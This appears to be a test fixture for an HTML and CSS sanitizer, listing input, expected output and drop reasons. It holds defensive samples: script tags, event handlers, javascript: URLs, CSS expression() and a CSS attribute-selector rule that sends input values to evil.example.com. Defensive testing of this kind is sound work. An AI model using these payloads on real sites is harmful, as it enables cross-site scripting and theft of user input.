profile: fullpage-v1
version: 1

=== HTML ===

--- plain
in  : "<h1>Hello</h1><p>A <strong>short</strong> page.</p>"
out : "<h1>Hello</h1><p>A <strong>short</strong> page.</p>"

--- links
in  : "<a href=\"/about\">rel</a><a href=\"https://example.com\" target=\"_blank\">abs</a>"
out : "<a href=\"/about\">rel</a><a href=\"https://example.com\" target=\"_blank\" rel=\"noopener noreferrer nofollow ugc\">abs</a>"
drop: forbidden_attribute "rel=" (rel rewritten to force noopener/noreferrer/nofollow/ugc on target=_blank)

--- link_with_rel
in  : "<a href=\"/x\" rel=\"author noopener\" target=\"_blank\">x</a>"
out : "<a href=\"/x\" target=\"_blank\" rel=\"author noopener noreferrer nofollow ugc\">x</a>"
drop: forbidden_attribute "rel=author noopener" (rel rewritten to force noopener/noreferrer/nofollow/ugc on target=_blank)

--- images
in  : "<img src=\"/assets/a.png\" alt=\"a\" width=\"10\" height=\"10\"><img src=\"https://evil.example.com/b.png\">"
out : "<img src=\"/assets/a.png\" alt=\"a\" width=\"10\" height=\"10\"><img>"
drop: external_resource "https://evil.example.com/b.png" (asset URL does not match any allowed prefix)

--- data_image
in  : "<img src=\"data:image/png;base64,AAAA\" alt=\"d\"><img src=\"data:image/svg+xml,<svg/>\">"
out : "<img src=\"data:image/png;base64,AAAA\" alt=\"d\"><img>"
drop: external_resource "data:image/svg+xml,<svg/>" (data: media type not allowed)

--- script
in  : "<p>before</p><script>alert(1)</script><p>after</p>"
out : "<p>before</p><p>after</p>"
drop: forbidden_element "script" (tag is always forbidden)

--- handlers
in  : "<p onclick=\"alert(1)\" class=\"keep\" id=\"gb-shell-x\">t</p>"
out : "<p class=\"keep\" id=\"user-gb-shell-x\">t</p>"
drop: event_handler "onclick" (event handler attributes are forbidden)

--- js_url
in  : "<a href=\"javascript:alert(1)\">a</a><a href=\"java&#9;script:alert(1)\">b</a>"
out : "<a>a</a><a>b</a>"
drop: forbidden_url "javascript:alert(1)" (forbidden URL scheme: javascript)
drop: forbidden_url "java\tscript:alert(1)" (unparseable URL)

--- nesting
in  : "<div><section><p>deep <em>and <strong>deeper</strong></em></p></section></div>"
out : "<div><section><p>deep <em>and <strong>deeper</strong></em></p></section></div>"

--- unclosed
in  : "<div><p>one<p>two<span>three"
out : "<div><p>one<p>two<span>three</span></p></p></div>"

--- self_closing
in  : "<a/><br/><img/><p/>"
out : "<a><br><img><p></p></a>"

--- table
in  : "<table><thead><tr><th scope=\"col\">h</th></tr></thead><tbody><tr><td colspan=\"2\">c</td></tr></tbody></table>"
out : "<table><thead><tr><th scope=\"col\">h</th></tr></thead><tbody><tr><td colspan=\"2\">c</td></tr></tbody></table>"

--- entities
in  : "<p>a &amp; b &lt; c &#65; &copy;</p>"
out : "<p>a &amp; b &lt; c A ©</p>"

--- comment
in  : "<p>a<!-- secret -->b</p>"
out : "<p>ab</p>"
drop: comment "// comment" (HTML comments are not allowed)

--- foreign
in  : "<svg><circle/></svg><math><mi>x</mi></math>"
out : ""
drop: forbidden_element "svg" (tag is always forbidden)
drop: forbidden_element "math" (tag is always forbidden)

--- srcset
in  : "<source srcset=\"/assets/a.png 1x, /assets/b.png 2x\" type=\"image/png\">"
out : "<source type=\"image/png\">"
drop: forbidden_attribute "srcset" (attribute not in allowlist for tag)

=== CSS ===

--- basic
in  : "h1 { color: navy; margin: 0 0 1rem }"
out : "h1{color:navy;margin:0 0 1rem;}"

--- media
in  : "@media screen and (min-width: 600px) { p { color: red } h1 { font-size: 2rem } }"
out : "@media screen and (min-width: 600px){p{color:red;}h1{font-size:2rem;}}"

--- supports
in  : "@supports (display:grid) { .g { display: grid } }"
out : "@supports (display:grid){.g{display:grid;}}"

--- nested_media
in  : "@media screen { @media print { p { color: red } } }"
out : "@media screen{@media print{p{color:red;}}}"

--- functions
in  : ".c { width: calc(100% - 2rem); color: rgb(1 2 3 / .5); background: linear-gradient(180deg,#fff,#eee) }"
out : ".c{width:calc(100% - 2rem);color:rgb(1 2 3 / .5);background:linear-gradient(180deg,#fff,#eee);}"

--- url_ok
in  : ".h { background-image: url('/assets/hero.png') }"
out : ".h{background-image:url('/assets/hero.png');}"

--- url_bad
in  : ".h { background-image: url('https://evil.example.com/x.png') }"
out : ""
drop: external_css "https://evil.example.com/x.png" (asset URL does not match any allowed prefix)

--- forbidden
in  : "@import url('https://evil.example.com/x.css'); p { width: expression(alert(1)) }"
out : ""
drop: forbidden_css_rule "@import" (@-rule not in allowlist)
drop: forbidden_css_function "expression" (function not in allowlist)

--- universal
in  : "* { color: red } .ok { color: blue }"
out : ".ok{color:blue;}"
drop: forbidden_css_rule "*" (universal selector is forbidden)

--- shell_ns
in  : ".gb-shell-main { color: red } .mine { color: blue }"
out : ".mine{color:blue;}"
drop: forbidden_css_rule ".gb-shell-main" (selector targets shell namespace)

--- attr_selector
in  : "input[value^=\"a\"] { background: url(\"https://evil.example.com/?c=a\") }"
out : ""
drop: forbidden_css_rule "input[value^=\"a\"]" (attribute selectors are not allowed)

--- custom_props
in  : ":where(.t) { --brand: #06f; color: var(--brand) }"
out : ":where(.t){--brand:#06f;color:var(--brand);}"

--- comments
in  : "/* c */ p /* c */ { color: red /* c */ }"
out : "p{color:red;}"

--- pseudo
in  : "a:hover { color: red } a:has(b) { color: blue }"
out : "a:hover{color:red;}"
drop: forbidden_css_rule "a:has(b)" (pseudo-class :has not in allowlist)
